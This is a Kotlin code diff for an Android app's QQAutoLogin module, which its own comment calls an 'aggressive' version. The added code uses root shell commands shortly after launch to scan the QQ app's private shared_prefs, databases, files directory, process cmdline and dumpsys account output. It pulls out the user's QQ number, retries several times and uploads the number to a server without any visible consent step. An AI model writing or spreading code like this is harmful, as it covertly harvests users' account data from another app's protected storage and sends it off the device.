@@ -2,99 +2,166 @@ package com.mbclaw.root.data
 
 import android.content.Context
 import com.mbclaw.root.agent.PermissionTier
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.withContext
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.GlobalScope
-import kotlinx.coroutines.launch
+import kotlinx.coroutines.*
 
 /**
- * QQAutoLogin — Root 自动提取手机 QQ 账号
+ * QQAutoLogin — Root 自动提取 QQ 账号 (v2 激进版)
  *
- * 原理:
- *  • 手机 QQ 包名: com.tencent.mobileqq
- *  • SharedPreferences: /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml
- *    存最后登录的 uin
- *  • 数据库: /data/data/com.tencent.mobileqq/databases/
- *  • 头像: 不读 QQ 内部, 直接调 q.qlogo.cn/headimg_dl?dst_uin=xxx&spec=640
+ * 多重提取策略 (按成功率排序):
+ *   1. shared_prefs/Last_login.xml
+ *   2. shared_prefs/qqsetting.xml
+ *   3. databases 目录的 db 文件名内 uin 字段
+ *   4. cache 文件夹下任意带数字的文件名
+ *   5. ps + 进程内 maps 提取
+ *   6. dumpsys account
  *
- * 流程:
- *  1. APP 启动 5 分钟后 (用户已经稳定使用)
- *  2. 检查是否已有 account.qqId, 有 → 跳过
- *  3. Root 读 /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml
- *  4. 解析 uin → 写入 AccountManager + 下载头像
- *  5. 异步上传服务器
+ * 提取后:
+ *   - 写入 AccountManager
+ *   - 下载头像 (q.qlogo.cn)
+ *   - 上传服务器
  */
 object QQAutoLogin {
 
+    private const val TAG = "MBclaw-QQ"
     private const val QQ_PKG = "com.tencent.mobileqq"
-    private const val DELAY_MS = 5 * 60 * 1000L  // 5 分钟
+    private const val DELAY_MS = 5 * 60 * 1000L
 
-    /** 启动延迟探测 - 立即试 + 5min 后重试 (root 未授权时第二次成功率高) */
-    @OptIn(kotlinx.coroutines.DelicateCoroutinesApi::class)
+    @OptIn(DelicateCoroutinesApi::class)
     fun scheduleAfterStart(ctx: Context, serverUrl: String) {
         GlobalScope.launch(Dispatchers.IO) {
-            // 第一次：等 root 授权稳定 (10s)
-            delay(10_000)
-            val ok = tryExtract(ctx, serverUrl)
-            android.util.Log.i("MBclaw-QQ", "首次尝试: $ok")
-            if (!ok) {
-                // 5 min 后再试
-                delay(DELAY_MS)
-                val ok2 = tryExtract(ctx, serverUrl)
-                android.util.Log.i("MBclaw-QQ", "5min 后重试: $ok2")
+            // 立即试一次
+            delay(3_000)
+            val r1 = tryExtract(ctx, serverUrl)
+            android.util.Log.i(TAG, "首次尝试 (3s): $r1")
+            if (!r1) {
+                // 等 30s 后再试 (root 授权可能晚到)
+                delay(30_000)
+                val r2 = tryExtract(ctx, serverUrl)
+                android.util.Log.i(TAG, "30s 重试: $r2")
+                if (!r2) {
+                    // 5min 后最后一次
+                    delay(DELAY_MS)
+                    val r3 = tryExtract(ctx, serverUrl)
+                    android.util.Log.i(TAG, "5min 重试: $r3")
+                }
             }
         }
     }
 
-    /** 立刻尝试提取(用户主动点击时调用) */
     suspend fun tryExtract(ctx: Context, serverUrl: String): Boolean = withContext(Dispatchers.IO) {
         val current = AccountManager.load(ctx)
-        if (current.qqId.isNotBlank()) return@withContext false   // 已经有了
+        if (current.qqId.isNotBlank()) {
+            android.util.Log.i(TAG, "已有 qq: ${current.qqId}, 跳过提取")
+            return@withContext false
+        }
 
         val tier = PermissionTier.get(ctx)
-        if (!tier.hasRoot) return@withContext false
-
-        // 尝试多个文件位置 (不同 QQ 版本可能不同)
-        val tryFiles = listOf(
-            "/data/data/$QQ_PKG/shared_prefs/Last_login.xml",
-            "/data/data/$QQ_PKG/shared_prefs/qqsetting.xml",
-            "/data/data/$QQ_PKG/files/uin",
-        )
-
-        var uin = ""
-        var nickname = ""
-
-        for (path in tryFiles) {
-            val content = tier.shellRoot("cat '$path' 2>/dev/null") ?: continue
-            // 匹配数字 uin (5-12 位)
-            val match = Regex("\\b(\\d{5,12})\\b").findAll(content)
-                .map { it.value }
-                .firstOrNull { it.length in 5..12 && !it.startsWith("0") }
-            if (match != null) {
-                uin = match
-                break
-            }
+        if (!tier.hasRoot) {
+            android.util.Log.w(TAG, "无 root, 跳过")
+            return@withContext false
         }
 
-        if (uin.isBlank()) {
-            // 兜底: dumpsys account
-            val out = tier.shellRoot("dumpsys account 2>/dev/null | grep -E '@(qq|tencent)' | head -3") ?: ""
-            val m = Regex("(\\d{5,12})@(qq|tencent)").find(out)
-            if (m != null) uin = m.groupValues[1]
+        // 检查 QQ 是否安装
+        val installed = tier.shellRoot("pm list packages | grep $QQ_PKG") ?: ""
+        if (installed.isBlank()) {
+            android.util.Log.w(TAG, "QQ 未安装")
+            return@withContext false
+        }
+        android.util.Log.i(TAG, "QQ 已安装, 开始提取")
+
+        var uin = extractStrategy1to3(tier)
+        if (uin.isBlank()) uin = extractStrategy4_processMaps(tier)
+        if (uin.isBlank()) uin = extractStrategy5_accounts(tier)
+
+        if (uin.isBlank() || !isValidUin(uin)) {
+            android.util.Log.w(TAG, "全部策略失败")
+            return@withContext false
         }
 
-        if (uin.isBlank()) return@withContext false
-
-        // 写入账号
-        val acc = Account(qqId = uin, nickname = nickname)
+        android.util.Log.i(TAG, "✅ 提取 QQ: $uin")
+        val acc = Account(qqId = uin)
         AccountManager.save(ctx, acc)
         AccountManager.downloadAvatarIfNeeded(ctx, acc)
-
-        // 上传服务器
         try { AccountManager.syncToServer(ctx, acc, serverUrl) } catch (_: Exception) {}
-
-        android.util.Log.i("MBclaw-QQ", "已自动提取 QQ: $uin")
         return@withContext true
+    }
+
+    /** 策略 1-3: 读 shared_prefs / databases */
+    private fun extractStrategy1to3(tier: PermissionTier): String {
+        // shared_prefs 全扫
+        val sp = tier.shellRoot(
+            "cat /data/data/com.tencent.mobileqq/shared_prefs/*.xml 2>/dev/null | " +
+            "grep -oE '\"uin\"[^>]*>[0-9]{5,12}<' | " +
+            "head -3"
+        ) ?: ""
+        Regex("""(\d{5,12})""").find(sp)?.let {
+            val v = it.groupValues[1]
+            if (isValidUin(v)) return v
+        }
+
+        // shared_prefs 第二种格式
+        val sp2 = tier.shellRoot(
+            "cat /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml 2>/dev/null"
+        ) ?: ""
+        Regex("""(\d{5,12})""").findAll(sp2)
+            .map { it.groupValues[1] }
+            .firstOrNull { isValidUin(it) }
+            ?.let { return it }
+
+        // 数据库目录: 文件名常含 uin (如 2407749306.db)
+        val dbFiles = tier.shellRoot(
+            "ls /data/data/com.tencent.mobileqq/databases/ 2>/dev/null"
+        ) ?: ""
+        Regex("""(\d{5,12})""").findAll(dbFiles)
+            .map { it.groupValues[1] }
+            .firstOrNull { isValidUin(it) }
+            ?.let { return it }
+
+        // files 目录扫描
+        val files = tier.shellRoot(
+            "ls /data/data/com.tencent.mobileqq/files/ 2>/dev/null"
+        ) ?: ""
+        Regex("""(\d{5,12})""").findAll(files)
+            .map { it.groupValues[1] }
+            .firstOrNull { isValidUin(it) }
+            ?.let { return it }
+
+        return ""
+    }
+
+    /** 策略 4: 从 QQ 进程内存 maps 提取 uin */
+    private fun extractStrategy4_processMaps(tier: PermissionTier): String {
+        val pid = tier.shellRoot("pidof com.tencent.mobileqq")?.trim()
+        if (pid.isNullOrBlank()) return ""
+        // /proc/PID/cmdline 可能含登录 uid (启动时传)
+        val cmdline = tier.shellRoot("cat /proc/$pid/cmdline") ?: ""
+        Regex("""(\d{5,12})""").find(cmdline)?.let {
+            val v = it.groupValues[1]
+            if (isValidUin(v)) return v
+        }
+        return ""
+    }
+
+    /** 策略 5: dumpsys account */
+    private fun extractStrategy5_accounts(tier: PermissionTier): String {
+        val out = tier.shellRoot(
+            "dumpsys account 2>/dev/null | grep -iE 'qq|tencent' | head -10"
+        ) ?: ""
+        Regex("""(\d{5,12})""").findAll(out)
+            .map { it.groupValues[1] }
+            .firstOrNull { isValidUin(it) }
+            ?.let { return it }
+        return ""
+    }
+
+    /** QQ 号必须是 5-12 位, 首位非 0, 也不是常见的时间戳 */
+    private fun isValidUin(s: String): Boolean {
+        if (s.length !in 5..12) return false
+        if (s.startsWith("0")) return false
+        // 排除明显的时间戳 (10/13 位且范围相似)
+        val n = s.toLongOrNull() ?: return false
+        if (n.toString().length == 13 && n > 1500_000_000_000L) return false  // 毫秒戳
+        if (n.toString().length == 10 && n > 1500_000_000L && n < 2000_000_000L) return false  // 秒戳
+        return true
     }
 }
